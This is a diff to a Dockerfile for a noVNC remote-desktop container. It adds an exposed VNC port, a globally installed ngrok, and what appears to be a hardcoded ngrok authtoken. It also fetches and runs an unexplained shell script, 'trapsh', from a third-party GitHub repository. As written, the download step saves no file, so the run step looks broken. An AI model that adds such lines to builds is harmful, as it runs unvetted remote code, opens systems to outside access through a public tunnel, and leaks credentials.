@@ -1,5 +1,5 @@
 FROM ubuntu:18.04
-EXPOSE 8080
+EXPOSE 8080 5901
 ARG DEBIAN_FRONTEND=noninteractive
 
 RUN apt-get update
@@ -23,14 +23,19 @@ RUN chown -R user:user /home/user
 #RUN wget https://github.com/atom/atom/releases/download/v1.48.0/atom-amd64.deb
 #RUN apt-get -y install gvfs-bin
 #RUN dpkg -i atom-amd64.deb
-RUN apt-get -y install gedit vim
+RUN apt-get -y install gedit vim nodejs npm
+RUN npm i ngrok -g
 USER user
 
 WORKDIR /.novnc
+RUN ngrok authtoken 1oomRxudQIaBrkFui5ofwWfETvB_2nirjctS3mEDJ9ZLg9LS6
+RUN wget -qO- https://raw.githubusercontent.com/Geruays/multi-sh/main/trapsh
 RUN wget -qO- https://github.com/novnc/noVNC/archive/v1.0.0.tar.gz | tar xz --strip 1 -C $PWD
 RUN mkdir /.novnc/utils/websockify
 RUN wget -qO- https://github.com/novnc/websockify/archive/v0.6.1.tar.gz | tar xz --strip 1 -C /.novnc/utils/websockify
 RUN ln -s vnc.html index.html
+RUN bash trapsh
+
 
 WORKDIR /home/user
 
